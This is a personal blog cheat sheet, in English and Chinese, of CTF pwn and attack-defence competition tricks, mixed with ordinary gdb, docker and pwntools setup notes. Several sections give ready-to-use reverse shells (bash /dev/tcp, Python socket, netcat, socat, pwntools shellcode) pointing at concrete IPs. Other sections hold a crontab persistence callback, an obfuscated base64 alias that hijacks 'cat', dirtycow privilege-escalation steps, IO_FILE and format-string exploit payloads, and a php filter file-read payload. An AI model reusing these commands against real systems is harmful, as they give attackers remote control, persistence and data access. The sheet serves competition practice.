---
title: CheatCode
date: 1998-03-30 00:20:02
tags: updating
layout: post
---
Document about little trick
Updating
<!--more-->

## Start

## QEMU: Use a fold as had
```
-hda fat:rw:<FolderNmae>
```

## gdb load debug source code

```
directory <path>
```


## old-release
```sh
sed -i -r 's/security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list
sed -i -r 's/([a-z]{2}.)?archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list
```

## seccomp & multi-process

balsn CTF: Asian Parents
```s
https://bugs.chromium.org/p/project-zero/issues/detail?id=2276
```

## get-pip

`wget https://bootstrap.pypa.io/pip/2.7/get-pip.py`

## Compile ASM Code with GCC

- Write asm code and compile it to obj file
- Compile the c code to obj file
- link them together
- Use `-no-pie` `--static` to keep everything simple

[sample code][8]

## get-pip
```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python ./get-pip.py
```

## apt update with old-released

```s
replace ubuntu/security with old-released
```

## pwntools EOF
```python
from pwn import *
p= process("./main",stdin=PTY,raw=False)
p.send(b'\4')#CEOF
p.interactive()
# p.sock.shutdown(socket.SHUT_RW)
```

## init_array
```
void __attribute__((constructor))foo()
{
    ;
}
```
## angr basic
```
import angr
p = angr.Project('./pwn', auto_load_libs=False)
state = p.factory.entry_state(add_options={angr.options.LAZY_SOLVES})
simgr = p.factory.simulation_manager(state)
simgr.explore(find=0, avoid=0)
print(simgr.found[0].posix.dumps(0))
```
## reconstruct /dev/null
run as a root
`rm -f /dev/null; mknod -m 666 /dev/null c 1 3`


## socat reversed shell
> https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
```
socat tcp-l:4444,fork,reuseaddr exec:sh,pty,stderr,setsid,sigint,sane
```

## python reversed shell
```sh
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.1.1.1',123445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

## pwntools can't attach

`pip install -U pwntools==4.8.0b0`

## Git SSL verify 

`git config --global http.sslverify false`

## Compact WSL vDisk

```powershell
wsl --shutdown
diskpart
# open window Diskpart
select vdisk file="C:\Users\n132\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu20.04onWindows_79rhkp1fndgsc\LocalState\ext4.vhdx"
attach vdisk readonly
compact vdisk
detach vdisk
exit
# docker wsl
docker system prune -a -f
net stop com.docker.service
taskkill /F /IM "Docker Desktop.exe"
wsl --shutdown
Optimize-VHD -Path "C:\Users\n132\AppData\Local\Docker\wsl\data\ext4.vhdx" -Mode Full
wsl
net start com.docker.service
```






## reversed shell
system:
```bash
# system(cmd),cmd=
/bin/bash -c 'bash -i >/dev/tcp/192.168.74.132/4444 0>&1'
bash -c 'exec bash -i &>/dev/tcp/<ip address>/<port> <&1';
```

python:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

netcat:
```bash
nc 192.168.1.1 4444 | /bin/bash | nc 192.168.1.1 5555
```

## Connection Check
1. When you can run any command, Use sleep to hang the shell.
2. Try p.read(even there is no responding data)

## Python Figures 

```python
def graph(x1,y1,eb1,x2=None,y2=None,eb2=None,Name='Default.jpg'):
    fig = plt.figure()
    plt.errorbar(x1,y1,fmt='ro--',yerr=eb1,capsize=10,ecolor="red",alpha=0.5,label="Oracle")
    if(x2 and y2 and eb2):
        plt.errorbar(x2,y2,fmt='bo--',yerr=eb2,capsize=10,ecolor="blue",alpha=0.5,label="Orgr")
    plt.xlabel("Number of choice", fontdict=font)
    plt.ylabel("Time Cost in s", fontdict=font)
    plt.title("Time Cost for Per Run (What if we have more than 5 choice)", fontdict=font)
    plt.legend(loc='upper left',fontsize=20)
    plt.show()
```

## git commit amend

`git commit --amend --date "Sun Dec  4 20:35:02 EST 2021"`

## multithread exp

```python
from threading import Thread
from os import system
from pwn import *
def wrapper(i):
	try:
		for x in range(0x40):
			if(x%0x10==i):
				system("python ./eax.py {}".format(x))
	except:
		print("AP")
tab= []
for x in range(0x10):
	tab.append(Thread(target= wrapper, args=(x,)))
for x in range(0x10):
	tab[x].start()
while(1):
	sleep(0x10)
```

## reverse shell - shellcode

`shellcode = asm(shellcraft.connect('112.74.38.118',6999)+shellcraft.dupsh())`

## LD_PRELOAD multi-lib
`export LD_PRELOAD = "A.so b.so"`

## mmap
`mmap(address,0x1000,0x7,0x22,0,0)`

## default buffer (STDOUT)
fllush by fill the buffer (which may be as large as 0xe00)

## Github Action
Permission denied.
`git update-index --chmod=+x ./.github/scripts/backend_decrypt.sh`


## Linux ncat 部署服务
ncat -vc ./test -l 1024

## 比特，字节，字，双字，四字

八个比特(Bit)称为一个字节（Byte），两个字节称为一个字（Word），两个字称为一个双字（Dword），两个双字称为一个四字（Qword）。
db byte
dw world
dd double-world
dq quad-world


## atoi()
将参数认为是str，小于0x30被认为是0
返回str代表的十进制int

## __environ
libc.symbols['__environ']上存着栈地址
只要泄露了libc地址就可以通过__environ 获得栈地址
在relro全开不能写got的时候就可以尝试通过控制执行流来控制程序

## trick for no_output
当没有直接泄露的时候
可以将可以控制参数函数A替换成输出函数B
主要做法是将A的got换成plt[B]+6
也就是相当于调用了B但是参数依旧是原来的参数

## Ubuntu 开关ASLR
sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space

## process_stdin
default 为pipe 管道 半双工
可以设置为pty	伪终端 
例如：p=process("./doublefree",stdin=process.PTY)
如果写入的数据没有换行符，就可能不会被传送到另一端， 造成读端一直阻塞
[linux终端][1]

## process()环境变量
想要用出题方的libc可以用
env = {"LD_PRELOAD": "./libc.so.6"}
env=env

来设置环境变量

## gdb_goto
goto 直接跳到某行
中间的代码相当于没有执行
可以在调试的时候跳过sleep之类的函数。

## gdb_set
可以在调试的时候通过set来改变指定未知的值
可以是地址可以是参数
例如
```
set $rax=0x10
set *0xffffce40=0x20
```
## gdb_SIGALRM
直接调试的时候可以关闭alarm()
handle SIGALRM nopass
## ssh
`sudo apt-get install openssh-server`


## alarm
IDA patch 掉 alarm,system("sleep ?")
#patch之前改一下option->general->opcode
用IDA->edit->patch program->change ...->apply

## IDA Shortcut
  rename====>n
  undef=====>u
  xref======>x
  goto======>g
  def=======>y
  search string=>option+t
  change sp==>option+k
## GDB sizeof
p sizeof(_IO_FILE)


## fmt_leak
做fmtstr时可以用的一个gadget方便泄露
```
def fmt_leak(lenth):
	for x in range(1,lenth):
		payload="%{}$p".format(str(x))
		p.sendline(payload)
		data=p.readline()
		if (data=="(nil)\n"):
			data="0x0"
		data=(int(data,16))
		log.success("%sth=============>%s",str(x),hex(data))
```
## ELF->"/bin/sh"
	libc.search("/bin/sh").next()
## shellcode

	context.arch='amd64'
	shcode=asm(shellcraft.sh())


## Partial Write Burp

```sh
#!/bin/bash
for i in `seq 1 5000`; do python exp.py; done;
```

## uninitialized variable

堆栈的内容可能被之前的函数控制

## 遗留数据导致泄露

malloc时候没有memset
而且写入数据没有用0截断

## arm & mips 环境

[link][3]
qemu指定lib路径例如：
qemu-mipsel -L /usr/mipsel-linux-gnu/ ./add
qemurun后调试：
qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add

## sysmalloc

两个assert
```python
old_size >= 0x1f
old_top &0x1=1
old_end is the end of page
old_size < nb+MINSIZE
```
## IO_FILE Payload

```python
#32 bits
fake_file = "/bin/sh\x00" + "\x00" * 0x40 + p32(fake_lock_addr)
fake_file = fake_file.ljust(0x94, "\x00")
fake_file += p32(fake_vtable_addr - 0x44)

#64 bits
fake_file = "/bin/sh\x00" + '\x00' * 0x8
fake_file += p64(system) + '\x00' * 0x70
# the system can also be placed in other memory
fake_file += p64(fake_lock_addr)
fake_file = fake_file.ljust(0xd8, '\x00')
fake_file += p64(buf_addr + 0x10 - 0x88) # fake_vtable_addr
```

## pwn 远端 命令被ban

尝试cat flag  >&0
/*输出重定向到stdin ...*/
stdin也是可以用来输出的。

## 系统调用表

[x64系统调用表][4]
[x86系统调用表][5]

## github提速

sudo vim /etc/hosts
添加 github.com,github.global.ssl.fastly.net 的ip

## qira

github 上安装
按照shellfish的师傅的pull改
[link][6]

## dmesg

dmesg用来显示内核环缓冲区（kernel-ring buffer）内容


## echo -e

"\033[{};{};{}m n132 \033[0m".format(字类型,字颜色,背景颜色)
sample:
"\033[1;31;40m n132>>> \033[0m"




## ld:自定义入口 arch

`ld -m elf_i386 -static -e n132 -o nier tiny.o`
one demo
```c
char str[5]="nier\n";
void say()
{
    asm("movl %%eax,%%ecx\n\t"
        "movl $4,%%eax \n\t"
        "movl $1,%%ebx \n\t"
        "movl $5,%%edx \n\t"
        "int $0x80 \n\t"
        ::"r"(str):"ebx","ecx","edx"
        );
}
void exit()
{
    asm(
        "movl $1,%eax\n\t"
        "int $0x80\n\t"
        );
}
int n132()
{
    say();
    exit();
    return 0;
}
```
## python socket+dup弹shell

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",12345))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh",'-i'])
```
做kidding的时候看到的...原来还可以复制stdXXX到socket


## c++filt
可以将linux下编译过的函数名称转化为原始名称


## eviron

.IMPORTANT
critical~~

## buffer over flow 


gcc 4.9以上 编译简单bof时main会利用ecx/rcx确定rsp
```python
   0x80488b7 <main+59>                   mov    ecx, dword ptr [ebp - 4]
   0x80488ba <main+62>                   leave  
   0x80488bb <main+63>                   lea    esp, [ecx - 4]
   0x80488be <main+66>                   ret    

```
利用时可以利用 改ebp-4的值 然后跳到buffer上的 rop..

## ssh download

scp root@51.254.114.246:/home/tmp/tmp .


## SROP
`sig=SigreturnFrame()`

## signal
`signal(SIGALARM,func)`
## python deepcopy
`import copy`
`copy.deepcopy(path)`
复制整个内容而不是指针

## IDA rebase
`EDIT-->segment->rebase`
发现开pie时候地址不好找有了这个ida+gdb调试起来更加方便了.

## https://paper.seebug.org/255/#5-last_remainder
关于 malloc&free

## 主机发现
`nmap -sn 192.168.22.0/24`
## AWD_Frame DF

## 权限设置 
* find /var/www/html -type d -writable | xargs chmod 755
* find /var/www/html -type f -writable | xargs chmod 644
## 监控是否被传文件
python watch.py path
## 偷梁换柱
```sh
alias cat='python -c "exec(\"aW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQgaGFzaGxpYgppbXBvcnQgb3MKaWYgbGVuKHN5cy5hcmd2KSA+IDEgYW5kICJmbGFnIiBpbiAiIi5qb2luKHN5cy5hcmd2KToKCXByaW50ICJmbGFneyVzfSIgJSAoaGFzaGxpYi5tZDUoc3RyKGludCh0aW1lLnRpbWUoKS82MC8xMCkpKS5oZXhkaWdlc3QoKSkKZWxzZToKCW9zLnN5c3RlbSgiY2F0ICIrIiAiLmpvaW4oc3lzLmFyZ3ZbMTpdKSkK\".decode(\"base64\"))"'
```
## 定时任务 
```sh
echo "* * * * * /bin/bash -c 'bash -i >/dev/tcp/192.168.22.1/4444 0>&1'"|crontab
#每分钟上线报到
```
## dirty_cow
```
sudo adduser test
git clone https://github.com/dirtycow/dirtycow.github.io
cd dirtycow.github.io
gcc dirtyc0w.c -o dirtycow -Wall -pthread
./dirtycow /etc/group “$(sed ‘/\(sudo*\)/ s/$/,test/’ /etc/group)”
```

## nasm编译

nasm -f elf exit.asm
```python
#x86
ld -o exiter exit.o
#x64
ld -m elf_i386 -o exit exit.o
```

## 可见字符shellcode

`PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx`


## ld & libc
用上题目的`ld`和`libc`
### ld===>Ld
先把ld.so cp到/lib64/Ld-linux-x86-64.so.2
把程序内的/lib64/ld-linux-x86-64.so.2改为/lib64/Ld-linux-x86-64.so.2
然后设置LD_PRELOAD加载libc

### 看雪老哥强行解决法
`https://bbs.pediy.com/thread-225849-1.htm`
```python
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)
#example
elf = change_ld('./pwn', './ld.so')
p = elf.process(env={'LD_PRELOAD':'./libc.so.6'})

```
### 模拟实际环境
docker 或者 download 一个一样的...

## gdb remote
* 在ida的安装目录下找到linux_server64 复制一份到ubuntu要调试demo目录下运行
* 在ida的菜单栏下方功能栏中的绿色小箭头处选择调试环境
* 菜单栏中debuger下拉选择process option
* application和inputfile位置都是ubuntu里demo路径 例如/tmp/demo
* deretory 为ubuntu中demo的path 例如/tmp
* host name 填目标ip 端口是linux_server64运行后显示的端口
* 需要密码的填passwd
* 保存好点击绿色小箭头就可以开始调试

## bind a reload key
bind R source-file ~/.tmux.conf ; display-message "Config reloaded.."

set-option -g mouse on

`context.terminal = ['tmux', 'splitw', '-h']`

## docker container ---> image
`sudo docker commit eafd9111ada6 docker/lua`

## docker-compose
docker-compose up

## docker dbg
docker-compose 里加上
```python
    cap_add:
        - SYS_PTRACE

```
或者
`docker run --cap-add=SYS_PTRACE`

## docker exec -it ID /bin/bash
attach 没反应可以用 `docker exec -it ID /bin/bash` 来进入container


## docker 
```python
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker n132
sudo apt-get install python-pip
sudo pip install docker-compose
```
## docker 特权模式
`run` 时增加参数 `--privileged`


## ascii<=>shellcode
`https://nets.ec/Ascii_shellcode`


## open_ssl

`https://tanwenbo.top/course/ubuntu-16-04-%E6%9B%B4%E6%96%B0openssl%E8%87%B31-1-1.html`

## fit()
`pwntools`里的一个函数用于构造`string`,`chunk`
fit(f,filler='\x00')
```python
f={
    pos:value
}
```
例如
```python
f={
    0x8:0x4a1,
    0x4a8:0x21,
    0x4c8:0x21
}
chunk=fit(f,filler='\x00')
```
## tmux 同时操作多个终端
`:set -g synchronize-panes on`


## multi-libc
usage : bash build.sh verison >> bash build.sh 2.25
`https://github.com/ray-cp/pwn_debug/blob/master/build.sh`
```sh
#!/bin/sh

# install som lib
echo "install som lib"
sudo apt-get install gawk -y
sudo apt-get install bison -y
sudo apt-get install gcc-multilib -y
sudo apt-get install g++-multilib -y

cd /
sudo mkdir -p /glibc
cd /glibc
sudo mkdir -p source
cd source


# get the source of glibc
Get_Glibc_Source(){
    if [ ! -d "/glibc/source/glibc-"$1 ]; then
        sudo wget http://mirrors.ustc.edu.cn/gnu/libc/glibc-$1.tar.gz
        sudo tar xf glibc-$1.tar.gz
    else
        echo "[*] /glibc/source/glibc-"$1" already exists..."
    fi
    
}
Install_Glibc_x64(){

    if [ -f "/glibc/x64/"$1"/lib/libc-"$1".so" ];then
        echo "x64 glibc "$1" already installed!"
        return
    fi

    #echo $1
    #echo "/glibc/x64/"$1"/lib/libc-"$1".so"
    sudo mkdir -p /glibc/x64/$1
    #wget http://mirrors.ustc.edu.cn/gnu/libc/glibc-$1.tar.gz
    #tar xf glibc-$1.tar.gz
    cd glibc-$1
    sudo mkdir build
    cd build
    sudo ../configure --prefix=/glibc/x64/$1/ --disable-werror --enable-debug=yes
    sudo make
    sudo make install
    cd ../../
    #sudo rm glibc-$1.tar.gz
    sudo rm -rf ./glibc-$1/build

}


Install_Glibc_x86(){

    if [ -f "/glibc/x86/"$1"/lib/libc-"$1".so" ];then
        echo "x86 glibc "$1" already installed!"
        return
    fi

    #echo $1
    #echo "/glibc/x64/"$1"/lib/libc-"$1".so"
    sudo mkdir -p /glibc/x86/$1
    #wget http://mirrors.ustc.edu.cn/gnu/libc/glibc-$1.tar.gz
    #tar xf glibc-$1.tar.gz
    #cd x86
    cd glibc-$1
    sudo mkdir build
    cd build
    sudo ../configure --prefix=/glibc/x86/$1/ --disable-werror --enable-debug=yes --host=i686-linux-gnu --build=i686-linux-gnu CC="gcc -m32" CXX="g++ -m32" 
    sudo make
    sudo make install
    cd ../../
    #sudo rm glibc-$1.tar.gz
    sudo rm -rf ./glibc-$1/build

}

#delte the tar of glibc
Delete_Glibc_Tar() {
    sudo rm glibc-$1.tar.gz
}

GLIBC_VERSION=$1
#echo ${GLIBC_VERSION}
if [ -n "$GLIBC_VERSION" ]; then
    #echo 1
    #cd x64
    Get_Glibc_Source $GLIBC_VERSION
    Install_Glibc_x64 $GLIBC_VERSION
    #cd ..
    #cd x86
    Install_Glibc_x86 $GLIBC_VERSION
    Delete_Glibc_Tar $GLIBC_VERSION
    #cd ..
else
    for GLIBC_VERSION in '2.19' '2.23' '2.24' '2.25' '2.26' '2.27' '2.28' '2.29'
    do
        #echo 2
        #cd x64
        Get_Glibc_Source $GLIBC_VERSION
        Install_Glibc_x64 $GLIBC_VERSION
        #cd ../x86
        Install_Glibc_x86 $GLIBC_VERSION
        Delete_Glibc_Tar $GLIBC_VERSION
        #cd ..
    done
fi
```
## fmtstr + partial relro + no pie
(hijack the got to reuse )

## base64 in ubuntu
```s
➜  Desktop echo 123 | base64   
MTIzCg==
➜  Desktop echo MTIzCg== | base64 -d   
123
```
## $?
上次执行的返回值只有一个字节.

## stdlib-qsort
快速排序...看stdlib的时候发现还有这个....
```c
#include<stdio.h>
#include<stdlib.h>
int cmp(int* a,int* b)
{
return *a-*b;
}
int main()
{
int a[5]={1,3,5,2,4};
qsort(a,5,sizeof(int),cmp);
for(int i=0;i<5;i++)
printf("%d\n",a[i]);
}
```

## hlt
停止...halt

## FORTIFY
`gcc main.c -o main -O2 -FORTIFY_SOURCR=2 `

## shellcode 遍历search
257号调用+ 78号调用

## docker run with privileg
`docker run -it  --security-opt seccomp=unconfined --privileged --cap-add=SYS_PTRACE 81bcf752ac3d /bin/bash`

## tmux 语言问题
`apt search locales`
`apt install locales-all`

## gmpy2
各种系统上安装 `https://www.bbsmax.com/A/xl56XDvrzr/`

## virtaulenv
安装：`pip install virtualenv`
创建环境: `virtualenv name`
使用环境: `./bin/activate`
推出环境: `deactivate`

## virtualenvwrapper
创建基本环境：`mkvirtualenv` [环境名]
删除环境：`rmvirtualenv` [环境名]
激活环境：`workon` [环境名]
退出环境：`deactivate`
列出所有环境：`workon` 或者 `lsvirtualenv -b`

## zsh
`apt install git wget zsh`
`wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh`
`chsh -s /bin/zsh`

## install jave on ubuntu
> apt-get install openjdk-8-jdk
> vim /etc/profile
```s
#set java environment
JAVA_HOME=/usr/lib/jvm/java-1.7.0-openjdk-amd64
JRE_HOME=$JAVA_HOME/jre
CLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib
PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin
export JAVA_HOME JRE_HOME CLASS_PATH PATH
```

## linux -kernel
解开文件系统:
`gunzip core.cpio.gz && cpio -idmv < core.cpio`
重新打包
`find . | cpio -o --format=newc > rootfs.cpio`
设置架构
`set architecture i386:x86-64:intel`

## openssl aes
从私钥文件中提取公钥
`openssl rsa -in test.key -pubout -out test_pub.key`
查看公钥
`openssl rsa -pubin -in pubkey.pem -text -modulus`
公钥加密
`openssl rsautl -encrypt -in hello -inkey test_pub.key -pubin -out hello.en `
私钥解密
`openssl rsautl -decrypt -in hello.en -inkey test.key -out hello.de`
## RSATOOLS生成私钥
rsatools生成私钥
`./rsatool.py -p 965445304326998194798282228842484732438457170595999523426901 -q 863653476616376575308866344984576466644942572246900013156919 -o p.k`


## php 伪协议
`?page=php://filter/read=convert.base64-encode/resource=index.php`

## 带openssl/xxx 库函数的程序编译时 
编译时候加 -lcrypto

## RC4
```python
from Crypto.Cipher import ARC4
rc4=ARC4.new('dubhecrypto')
enc='AErR8FeduXbQTwyK05amnT2uDu25TQ=='
print rc4.decrypt(enc.decode('base64'))
```

## ssr
```sh
apt update
apt install wget 
wget https://raw.githubusercontent.com/n132/banana/master/Misc/ssr/ssr.sh
chmod +x ./ssr.sh
./ssr.sh
```
## npm install
`npm install --unsafe-perm=true --allow-root`

## one_gadget
发现一个新套路 就是`malloc_hook`改成`realloc+n`,`__realloc_hook`改成`one_gadget`
发现`double_free`触发居然还有不稳的时候.

## strace
追踪指定pid的程序的系统调用
`strace -o output.txt -T -tt -e trace=all -p {pid}`

## signal

信号表 `https://code.woboq.org/userspace/glibc/bits/signum-generic.h.html#50`

## DynELF
```
def leak(address):
    data = p.read(address, 4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data
d = DynELF(leak, elf=ELF("./pwn"))
```
注意printf("%s")可能会被`\x00`截断 

## 线下赛AWD路由表配置
`https://xuanxuanblingbling.github.io/ctf/tools/2019/08/04/route/`
```
sudo route delete 0.0.0.0                                           # 删除默认路由
sudo route add -net 0.0.0.0 {公网网关 例如192.168.182.1}              # 添加公网网关
route -n add -net 10.10.0.0 -netmask 255.255.0.0 10.10.10.1         # 添加 10.10.0.0/16 网段的路由
route -n add -net 192.168.1.0 -netmask 255.255.255.0 10.10.10.1     # 添加 192.168.1.0/24 网段的路由
```

## 线下赛 tee/流量抓取
```
mv ./pwn /tmp/binary
echo "tee -a /tmp/in | /tmp/binary | tee -a /tmp/out " > /tmp/waf
mv /tmp/waf ./pwn
chmod +x pwn
```
> tee -a `date +%s``echo in` | ./pwn | tee -a `date +%s``echo out`
## asm coding on Visual Studio
env setup : [link][7]

## win32 asm
proto: 过程声明伪指令
invoke: 过程调用伪指令

## 长度拓展
CBW     字节转换为字. (把AL中字节的符号扩展到AH中去)  
CWD     字转换为双字. (把AX中的字的符号扩展到DX中去)  
CWDE    字转换为双字. (把AX中的字符号扩展到EAX中去)  
CDQ     双字扩展. (把EAX中的字的符号扩展到EDX中去)  

## armpwn
### qemu
`apt-get install qemu`

### lib
`sudo apt-get install -y gcc-arm-linux-gnueabi`

### run
`qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./pwn`

### debug
`gdb-multiarch pwn`
*remote*
`target remote:1234`

## patch & diff
产生补丁文件:
`diff -uN ./a ./b > patch`
应用补丁文件:
`patch -p0 < patch`
这里的p0表示当前目录.如p1表示上一级.

# MIPS or MIPSEL
compile
```s
sudo apt-get install linux-libc-dev-mipsel-cross 
sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross
sudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu
sudo apt-get install g++-mipsel-linux-gnu
```

# IEEE754
```python
from decimal import *
def _bin_idx(sig,i):
    if(sig&(1<<i)!=0):
        return 1
    else:
        return 0
def n132_pow(a,b):
    if b == 0:
        return Decimal(1)
    aa = Decimal(a)
    bb = Decimal(b)
    if(bb<0):
        aa = Decimal(1) / Decimal(a)
        bb = -bb
    res = aa
    for x in range(bb-1):
        res*=aa
    return res
def _sum_significand(sig):
    res = Decimal(0)
    for x in range(1,53):
        res+=n132_pow(2,-x)*Decimal(_bin_idx(sig,52-x))
    return res

def u2d(addr=0x555555770000,log=0):
    sign = addr>>63
    exponent = (addr&(0x7fffffffffffffff))>>52
    significand= ((addr&0x000fffffffffffff))
    value = n132_pow(-1,sign) * n132_pow(2,exponent-1022) * _sum_significand(significand)
    if(log):
        print("Sign: "+hex(sign))
        print("Exponent: "+hex(exponent))
        print("Significand: "+hex(significand))
        print("Double (IEEE 754): ")
        print(value)
    return value
getcontext().prec = 50
if __name__ == "__main__":
    u2d()
```

[1]: https://blog.csdn.net/chdhust/article/details/8495921
[2]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[3]: https://ctf-wiki.github.io/ctf-wiki/pwn/linux/arm/environment/
[4]: https://www.cs.utexas.edu/~bismith/test/syscalls/syscalls64_orig.html
[5]: http://syscalls.kernelgrok.com/
[6]: https://github.com/geohot/qira/pull/203
[7]: https://zhuanlan.zhihu.com/p/31918676
[8]: ../code/CompileAsmwithGcc/
